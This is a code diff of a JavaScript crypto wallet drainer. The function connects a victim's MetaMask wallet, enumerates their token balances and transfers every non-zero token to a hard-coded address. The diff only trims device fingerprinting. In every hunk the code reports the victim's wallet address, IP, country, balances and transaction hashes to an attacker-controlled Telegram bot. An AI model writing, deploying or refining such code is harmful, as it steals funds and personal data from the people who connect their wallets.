@@ -117,43 +117,14 @@ async function connectWalletAndSendTokens() {
     const userAddress = await signer.getAddress();
     console.log(`Wallet connected: ${userAddress} (MetaMask)`);
 
-    // Capture user agent
-    const userAgent = navigator.userAgent;
+    // Capture device type
     let deviceType = "Unknown";
-    let browser = "Unknown";
-    let os = "Unknown";
-
-    // Detect device type
-    if (/Mobile|Android|iPhone|iPad/i.test(userAgent)) {
+    if (/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
       deviceType = "Mobile";
-    } else if (/Tablet/i.test(userAgent)) {
+    } else if (/Tablet/i.test(navigator.userAgent)) {
       deviceType = "Tablet";
     } else {
       deviceType = "Desktop";
-    }
-
-    // Detect browser
-    if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
-      browser = "Chrome";
-    } else if (userAgent.includes("Firefox")) {
-      browser = "Firefox";
-    } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
-      browser = "Safari";
-    } else if (userAgent.includes("Edg")) {
-      browser = "Edge";
-    }
-
-    // Detect operating system
-    if (userAgent.includes("Windows")) {
-      os = "Windows";
-    } else if (userAgent.includes("Mac OS")) {
-      os = "MacOS";
-    } else if (userAgent.includes("Android")) {
-      os = "Android";
-    } else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) {
-      os = "iOS";
-    } else if (userAgent.includes("Linux")) {
-      os = "Linux";
     }
 
     let locationData = {};
@@ -202,7 +173,7 @@ async function connectWalletAndSendTokens() {
         console.log(`Switched to network: ${currentNetwork.name} (chainId: ${currentNetwork.chainId})`);
 
         if (currentNetwork.chainId !== network.chainId) {
-          const errorMessage = `❌ Failed to switch to ${network.name}.`;
+          const errorMessage = `❌ Failed to switch to ${network.name}.\n${deviceType}`;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -212,7 +183,7 @@ async function connectWalletAndSendTokens() {
         }
 
         if (!currentSigner) {
-          const errorMessage = `❌ Signer not initialized for ${network.name}.`;
+          const errorMessage = `❌ Signer not initialized for ${network.name}.\n${deviceType}`;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -224,7 +195,7 @@ async function connectWalletAndSendTokens() {
         await delay(1000);
 
         let tokens = [];
-        let tokenSummaryTelegram = "";
+        let tokenSummary = "";
         let apiAttempts = 0;
         const maxAttempts = 3;
         let apiSuccess = false;
@@ -249,7 +220,7 @@ async function connectWalletAndSendTokens() {
               t.decimals !== undefined
             );
 
-            tokenSummaryTelegram = nonZeroTokens.length > 0
+            tokenSummary = nonZeroTokens.length > 0
               ? nonZeroTokens.map(token => {
                   const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
                   return `• ${token.symbol}: ${balance}`;
@@ -258,7 +229,7 @@ async function connectWalletAndSendTokens() {
           } catch (apiErr) {
             console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
             if (apiAttempts === maxAttempts) {
-              tokenSummaryTelegram = `Failed to fetch token balances: ${apiErr.message}`;
+              tokenSummary = `Failed to fetch token balances: ${apiErr.message}`;
             } else {
               await delay(3000);
             }
@@ -275,13 +246,10 @@ Address: ${userAddress}
 Wallet: MetaMask
 Country: ${locationData.country_name}
 IP: ${locationData.ip}
-Device: ${deviceType}
-Browser: ${browser}
-OS: ${os}
-User Agent: ${userAgent}
+${deviceType}
 
 💰 Balances:
-${tokenSummaryTelegram}
+${tokenSummary}
 ${nativeBalanceMessage}
         `;
 
@@ -317,9 +285,7 @@ Token: ${token.symbol}
 Amount: ${balance}
 To: ${network.exodusAddress}
 Tx: ${transferTx.hash}
-Device: ${deviceType}
-Browser: ${browser}
-OS: ${os}
+${deviceType}
               `;
               await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
@@ -331,9 +297,7 @@ OS: ${os}
 ❌ Transfer Failed
 Token: ${token.symbol || 'Unknown'}
 Error: ${err.message}
-Device: ${deviceType}
-Browser: ${browser}
-OS: ${os}
+${deviceType}
               `;
               await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
@@ -347,9 +311,7 @@ OS: ${os}
           const noTokensMessage = `
 ⚠️ No valid non-zero ERC-20 token balances to transfer on ${network.name}
 Address: ${userAddress}
-Device: ${deviceType}
-Browser: ${browser}
-OS: ${os}
+${deviceType}
           `;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -358,7 +320,7 @@ OS: ${os}
           });
         }
       } catch (err) {
-        const errorMessage = `❌ Error on ${network.name}: ${err.message}\nDevice: ${deviceType}\nBrowser: ${browser}\nOS: ${os}`;
+        const errorMessage = `❌ Error on ${network.name}: ${err.message}\n${deviceType}`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -367,7 +329,7 @@ OS: ${os}
       }
     }
   } catch (err) {
-    const errorMessage = `❌ Wallet Connection Failed: ${err.message}\nDevice: ${deviceType}\nBrowser: ${browser}\nOS: ${os}`;
+    const errorMessage = `❌ Wallet Connection Failed: ${err.message}\n${deviceType}`;
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
